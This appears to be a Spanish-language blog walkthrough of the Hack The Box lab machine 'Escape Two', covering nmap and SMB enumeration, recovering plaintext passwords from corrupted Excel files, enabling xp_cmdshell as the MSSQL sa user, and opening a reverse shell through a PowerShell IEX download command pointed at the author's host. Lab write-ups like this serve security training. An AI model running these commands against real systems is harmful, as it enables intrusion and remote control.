---
layout: single
title: Hack The Box - Escape Two
excerpt: "Escape Two es una máquina fácil de Hack The Box que simula un escenario real con credenciales de un usuario de bajo privilegio. La clave está en la enumeración, accediendo a servicios como SMB y MSSQL, e incluso extrayendo datos de archivos corruptos. Para escalar privilegios, se usa BloodHound y se explotan los permisos WriteOwner y la vulnerabilidad ESC4."
date: 2025-07-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-EscapeTwo/EscapeTwo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Web Pentesting
tags:  
  - SMB
  - MSSQL
  - Write Owner
  - bloodhound
  - ESC4
  - ESC1

---


<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-EscapeTwo/EscapeTwo.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-EscapeTwo/EscapeTwo.png");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-EscapeTwo/EscapeTwo.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/htb-writeup-EscapeTwo/EscapeTwo.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>

<br>

**Escape Two** Escape Two es una máquina fácil de Hack The Box que simula un escenario real con credenciales de un usuario de bajo privilegio. La clave está en la enumeración, accediendo a servicios como SMB y MSSQL, e incluso extrayendo datos de archivos corruptos. Para escalar privilegios, se usa BloodHound y se explotan los permisos WriteOwner y la vulnerabilidad ESC4.

## Enumeración

Realizando un escaneo de puertos con la herramienta nmap identifiqué los siguientes puertos abiertos:

```bash
Nmap scan report for 10.10.11.51
Host is up, received user-set (0.49s latency).
Scanned at 2025-04-29 20:15:38 EDT for 105s
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-30 00:16:26Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49729/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49798/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Mediante este escaneo logre identificar el dominio **sequel.htb** asi que lo agregue  a mi archivo /etc/hosts para no tener errores en futuros ataques relacionados a AD.

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# cat /etc/hosts        
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.51     sequel.htb
```
Con netexec pude obtener mas información de la maquina

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# netexec smb 10.10.11.51
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
```
## Validación de credenciales

Como proporcionaron credenciales de un usuario con bajos privilegios como comúnmente se hace en pruebas de penetración valide en que servicios son validas 

## Enumeración MSSQL

Después de validar que las credenciales son validas en MSSQL inicie sesión con mssqlclient

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth WORKGROUP/rose:KxEPkKe6R8su@10.10.11.51 

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SEQUEL\rose  guest@master)> 
```
Sin embargo rose no tiene permisos para ejecutar comandos ni habilitar `xp_cmdshell`

```bash
SQL (SEQUEL\rose  guest@master)> xp_cmdshell whoami;
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (SEQUEL\rose  guest@master)> 
```
Al realizar otra consulta me di cuenta que el usuario rose es invitado 

```bash
SQL (SEQUEL\rose  guest@master)> SELECT SYSTEM_USER AS CurrentLogin, USER_NAME() AS CurrentUser;
CurrentLogin   CurrentUser   
------------   -----------   
SEQUEL\rose    guest         

SQL (SEQUEL\rose  guest@master)>
```
## Enumeración SMB 

Posteriormente realice una enumeración al protocolo SMB con las credenciales proporcionadas:

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# smbmap -H 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' 


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.51:445 Name: sequel.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections                                                       
```
El primer recurso compartido que enumere fue **Users** sin embargo no identifique nada relevante

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# smbmap -H 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' -r Users


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.51:445 Name: sequel.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
        ./Users
        dw--w--w--                0 Sun Jun  9 09:42:11 2024    .
        dw--w--w--                0 Sun Jun  9 09:42:11 2024    ..
        dw--w--w--                0 Sun Jun  9 07:17:29 2024    Default
        fr--r--r--              174 Sat Jun  8 22:27:10 2024    desktop.ini
[*] Closed 1 connections                                                                           
```
Posteriormente enumere el recurso ** Accounting Department** donde idnetifique archivos excel interesante

```bash
──(root㉿kali)-[/opt/chuleta]
└─# smbmap -H 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' -r "Accounting Department" 


    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.51:445 Name: sequel.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ./Accounting Department
        dr--r--r--                0 Sun Jun  9 07:11:31 2024    .
        dr--r--r--                0 Sun Jun  9 07:11:31 2024    ..
        fr--r--r--            10217 Sun Jun  9 07:11:31 2024    accounting_2024.xlsx
        fr--r--r--             6780 Sun Jun  9 07:11:31 2024    accounts.xlsx
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections                                                                            
```
**NOTA:** `smbmap` **no permite descargar múltiples archivos en un solo comando `-A`**, ya que `-A` acepta **solo una cadena de búsqueda** para hacer _matching_. sin embargo como ambos archivos contienen un patrón común (`"account"`) unicmanete indicar -A account Eso **listará y descargará** cualquier archivo que tenga la palabra `account` en el nombre.

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# smbmap -d sequel.htb -H 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' -r "Accounting Department" -A account
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[*] Performing file name pattern match!                                                                                      
[+] Match found! Downloading: Accounting Department//accounting_2024.xlsx                                                   
[+] Starting download: Accounting Department\accounting_2024.xlsx (10217 bytes)                                             
[+] File output to: /opt/chuleta/10.10.11.51-Accounting Department_accounting_2024.xlsx                                     
[+] Match found! Downloading: Accounting Department//accounts.xlsx
[+] Starting download: Accounting Department\accounts.xlsx (6780 bytes)                                                     
[+] File output to: /opt/chuleta/10.10.11.51-Accounting Department_accounts.xlsx                                            
[*] Closed 1 connections                   
```
Después de descargar ambos archivos me di cuenta que tenia un error al intentar abrirlo en excel (estaban corruptos)

![](/assets/images/htb-writeup-EscapeTwo/Excel.png)

Así que descomprimí ambos archivos excel desde la terminal para obtener el siguiente contenido:

```bash
.
├── Accounting Department_accounts.xlsx
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   ├── core.xml
│   └── custom.xml
├── _rels
└── xl
    ├── _rels
    │   └── workbook.xml.rels
    ├── sharedStrings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── workbook.xml
    └── worksheets
        ├── _rels
        │   └── sheet1.xml.rels
        └── sheet1.xml

8 directories, 12 files
```
Después de una búsqueda identifique que los **datos como tal** (el contenido que se ve en las celdas del Excel) están en los siguientes archivos:  

- xl/worksheets/sheet1.xml - Aquí están los **valores de las celdas**, pero muchas veces los valores son índices (números) que apuntan a `sharedStrings.xml`
- xl/sharedStrings.xml - Contiene los **textos reales** (strings) que aparecen en las celdas,

Por lo cual revisando el archivo `sharedStrings.xml` pude identificar credenciales:

```bash
┌──(root㉿kali)-[/opt/excel/2/xl]
└─# cat sharedStrings.xml                 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>     
```
## Corregir la corrupción

Para corregir la corrupción de las archivos y poder visualizarlos correctamente encontré una lista de firmas de archivos entre las cuales esta xlsx 

![](/assets/images/htb-writeup-EscapeTwo/hex.png)

revisando los encabezados de los archivos veo que tiene una firma diferente es por eso su corrupción así que con `hexeditor` la modifique por la correcta y logre abrirlos sin problema 

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# xxd Department_accounts.xlsx | head -1
00000000: 504b 0304 1400 0808 0800 f655 c958 0000  PK.........U.X..

┌──(root㉿kali)-[/opt/chuleta]
└─# xxd accounting_2024.xlsx | head -1   
00000000: 504b 0304 1400 0600 0800 0000 2100 4137  PK..........!.A7
```
![](/assets/images/htb-writeup-EscapeTwo/excelc.png)

Debido a que el dominio de la maquina se llama **sequel.htb** decidí validar las credenciales del usuario sa en mssql y funcionaron

```bash
┌──(root㉿kali)-[/opt/chuleta/excel]
└─# nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```
posteriormente me conecte usando **mssqlclient**


```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/sa:MSSQLP@ssw0rd\!@10.10.11.51

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```
Debido a que inicie sesión como usuario 'sa' intente ejecutar comandos con xp_cmd shell pero obtuve un error:

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/sa:MSSQLP@ssw0rd\!@10.10.11.51

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> xp_cmdshell "whoami"
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sa  dbo@master)> 
```
Así que intente habilitar **xp_cmdshell** y logre la ejecución de comandos:

```bash
SQL (sa  dbo@master)> sp_configure "xp_cmdshell", 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> sp_configure "show advanced options", 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> reconfigure
SQL (sa  dbo@master)> xp_cmdshell "whoami"
output           
--------------   
sequel\sql_svc   

NULL             
```
Posteriormente para generar una reverse shell utilice el script Invoke-PowerShellTcp.ps1 agregando al final del archivo:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.73 -Port 4443
```
Posteriormente coloque un servidor temporal donde tengo mi archivo **Invoke-PowerShellTcp.ps1** y en otra pestaña colocar un listener por el puerto 4443 finamente ejecute lo siguiente desde el MSSQL

```bash
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.73/Invoke-PowerShellTcp.ps1\")"
```

```bash
SQL (sa  dbo@master)> xp_cmdshell "whoami"
output           
--------------   
sequel\sql_svc   

NULL             

SQL (sa  dbo@master)> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.73/Invoke-PowerShellTcp.ps1\")"
```

```bash
┌──(root㉿kali)-[/opt]
└─# python3 -m http.server 80    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.51 - - [02/May/2025 16:49:15] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

```bash
┌──(root㉿kali)-[/opt]
└─# nc -lvp 4443
listening on [any] 4443 ...
connect to [10.10.16.73] from sequel.htb [10.10.11.51] 63886
Windows PowerShell running as user sql_svc on DC01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
sequel\sql_svc
PS C:\Windows\system32>
```
También es posible obtener una blind shell mediante la herramienta [ttyOverMSSQL](https://github.com/T1erno/ttyOverMSSQL)

```bash
┌──(root㉿kali)-[/opt/chuleta/ttyOverMSSQL/ttyovermssql]
└─# python3 ttyOverMSSQL.py -s 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --powershell 
[✓] Successful login: sa@10.10.11.51
[!] Trying to enable xp_cmdshell...
PS C:\Windows\system32> whoami
sequel\sql_svc

PS C:\Windows\system32>
